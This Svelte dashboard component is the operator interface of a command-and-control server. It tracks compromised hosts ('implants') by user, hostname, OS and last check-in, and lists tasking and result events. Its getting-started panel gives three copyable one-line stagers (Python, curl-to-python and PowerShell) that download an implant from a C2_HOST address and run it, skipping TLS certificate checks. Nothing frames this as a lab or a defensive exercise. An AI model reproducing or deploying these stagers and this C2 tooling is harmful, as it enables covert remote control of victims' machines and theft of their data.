<script>
  import { onMount } from 'svelte';

  let { implants = [], onSelectImplant = () => {} } = $props();

  let auditEntries = $state([]);
  let loadingAudit = $state(true);

  const online  = $derived(implants.filter(i => i.status === 'online').length);
  const idle    = $derived(implants.filter(i => i.status === 'idle').length);
  const offline = $derived(implants.filter(i => i.status === 'offline').length);

  onMount(async () => {
    try {
      const res = await fetch('/api/audit');
      auditEntries = (await res.json()).slice(0, 12);
    } catch { auditEntries = []; }
    finally  { loadingAudit = false; }
  });

  function timeSince(iso) {
    if (!iso) return 'never';
    const diff = Date.now() - new Date(iso).getTime();
    const s = Math.floor(diff / 1000);
    if (s < 60)    return `${s}s ago`;
    if (s < 3600)  return `${Math.floor(s/60)}m ago`;
    if (s < 86400) return `${Math.floor(s/3600)}h ago`;
    return `${Math.floor(s/86400)}d ago`;
  }

  function platformIcon(os) {
    if (!os) return '◉';
    const o = os.toLowerCase();
    if (o.includes('windows')) return '🪟';
    if (o.includes('darwin') || o.includes('mac')) return '🍎';
    return '🐧';
  }

  const actionBadge = {
    implant_registered: 'badge-accent',
    task_queued:        'badge-primary',
    result_received:    'badge-success',
    task_cancelled:     'badge-warning',
  };

  let copiedIdx = $state(-1);
  async function copyCmd(text, idx) {
    try {
      await navigator.clipboard.writeText(text);
      copiedIdx = idx;
      setTimeout(() => { copiedIdx = -1; }, 1800);
    } catch {}
  }
</script>

<div class="p-6 h-full overflow-y-auto space-y-6">

  <!-- Stat cards -->
  <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
    {#each [
      { label: 'Total',   value: implants.length, accent: '#00e5b0', icon: '◈' },
      { label: 'Online',  value: online,           accent: '#3fb950', icon: '●' },
      { label: 'Idle',    value: idle,             accent: '#d29922', icon: '◐' },
      { label: 'Offline', value: offline,          accent: '#f85149', icon: '○' },
    ] as card}
      <div class="rounded-xl bg-base-200 border border-base-300 px-4 py-3 transition-all duration-200
                  hover:border-opacity-60"
           style="border-left: 3px solid {card.accent}">
        <div class="text-xs text-base-content/40 uppercase tracking-wider mb-1">{card.label}</div>
        <div class="text-2xl font-mono font-bold" style="color: {card.accent}">{card.value}</div>
      </div>
    {/each}
  </div>

  <!-- Two columns: implant overview + recent events -->
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">

    <!-- Implant overview table -->
    <div class="card bg-base-200 border border-base-300">
      <div class="card-body p-4">
        <div class="flex items-center gap-2 mb-3">
          <span class="text-xs text-base-content/40 uppercase tracking-[0.15em] font-semibold">Implants</span>
          <div class="flex-1 h-px bg-base-300"></div>
        </div>
        {#if implants.length === 0}
          <p class="text-sm text-base-content/30 py-4 text-center">Waiting for check-in…</p>
        {:else}
          <div class="overflow-x-auto">
            <table class="table table-xs w-full">
              <thead>
                <tr class="text-base-content/40">
                  <th>Status</th>
                  <th>Identity</th>
                  <th>OS</th>
                  <th>Last seen</th>
                </tr>
              </thead>
              <tbody>
                {#each implants as i (i.id)}
                  {@const s = i.status ?? 'offline'}
                  <tr class="hover cursor-pointer" onclick={() => onSelectImplant(i)}>
                    <td>
                      <div class="flex items-center gap-1.5">
                        <span class="inline-block w-2 h-2 rounded-full
                          {s==='online'?'bg-success animate-pulse':s==='idle'?'bg-warning':'bg-error'}"></span>
                        <span class="text-base leading-none">{platformIcon(i.os)}</span>
                      </div>
                    </td>
                    <td class="font-mono text-xs">{i.user}@{i.hostname}</td>
                    <td class="text-xs text-base-content/50 max-w-[120px] truncate">{i.os}</td>
                    <td class="text-xs text-base-content/40">{timeSince(i.last_seen)}</td>
                  </tr>
                {/each}
              </tbody>
            </table>
          </div>
        {/if}
      </div>
    </div>

    <!-- Recent audit events -->
    <div class="card bg-base-200 border border-base-300">
      <div class="card-body p-4">
        <div class="flex items-center gap-2 mb-3">
          <span class="text-xs text-base-content/40 uppercase tracking-[0.15em] font-semibold">Recent Activity</span>
          <div class="flex-1 h-px bg-base-300"></div>
        </div>
        {#if loadingAudit}
          <div class="flex justify-center py-6">
            <span class="loading loading-spinner loading-sm"></span>
          </div>
        {:else if auditEntries.length === 0}
          <p class="text-sm text-base-content/30 py-4 text-center">No activity yet.</p>
        {:else}
          <div class="space-y-0 text-xs">
            {#each auditEntries as e (e.timestamp + e.action)}
              {@const aColor = { implant_registered: '#f97316', task_queued: '#00e5b0', result_received: '#3fb950', task_cancelled: '#d29922' }[e.action] ?? '#c9d1d9'}
              <div class="flex items-center gap-2 py-1.5 border-b border-base-300/40 text-xs"
                   style="border-left: 2px solid {aColor}; padding-left: 8px; margin-left: -8px">
                <span class="font-mono text-base-content/40 truncate flex-1">
                  {e.action.replace(/_/g,' ')}
                  <span class="text-base-content/25">· {e.implant_id?.slice(0,8)}</span>
                </span>
                <span class="text-base-content/25 shrink-0">{timeSince(e.timestamp)}</span>
              </div>
            {/each}
          </div>
        {/if}
      </div>
    </div>

  </div>

  <!-- Getting started (shown when no implants) -->
  {#if implants.length === 0}
    <div class="card bg-base-200 border border-primary/20">
      <div class="card-body p-6">
        <h2 class="card-title text-primary text-sm mb-3">Getting Started</h2>

        <ol class="list-decimal list-inside space-y-2 text-sm text-base-content/60 mb-4">
          <li>Start the C2 server: <code class="kbd kbd-xs">python3 c2_beacon.py</code></li>
          <li>Deploy an implant using one of the stagers below.</li>
          <li>Implants appear here when they check in.</li>
        </ol>

        <!-- Stager commands -->
        <div class="space-y-2 mt-2">
          <p class="text-xs text-base-content/40 uppercase tracking-widest font-semibold mb-2">Quick Deploy Stagers</p>

          {#each [
            { label: 'Python (Linux/Mac)', idx: 0,
              cmd: `python3 -c "import urllib.request,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; exec(urllib.request.urlopen('https://C2_HOST:9444/api/stage/implant',context=ctx).read())"` },
            { label: 'Bash (curl + python)', idx: 1,
              cmd: `curl -sk https://C2_HOST:9444/api/stage/implant | python3` },
            { label: 'PowerShell (Windows)', idx: 2,
              cmd: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadString('https://C2_HOST:9444/api/stage/implant')|python3` },
          ] as stager}
            <div class="rounded-lg bg-base-300 border border-base-content/10 p-2.5">
              <div class="flex items-center justify-between mb-1.5">
                <span class="text-xs text-base-content/40 font-semibold">{stager.label}</span>
                <button
                  class="btn btn-xs btn-ghost text-xs {copiedIdx === stager.idx ? 'text-success' : 'text-base-content/40'}"
                  onclick={() => copyCmd(stager.cmd, stager.idx)}>
                  {copiedIdx === stager.idx ? '✓ Copied' : 'Copy'}
                </button>
              </div>
              <code class="text-xs font-mono text-primary/80 break-all">{stager.cmd}</code>
            </div>
          {/each}

          <p class="text-xs text-base-content/25 mt-2">
            Replace <code class="text-primary/60">C2_HOST</code> with your C2 server IP/hostname.
          </p>
        </div>
      </div>
    </div>
  {/if}

</div>
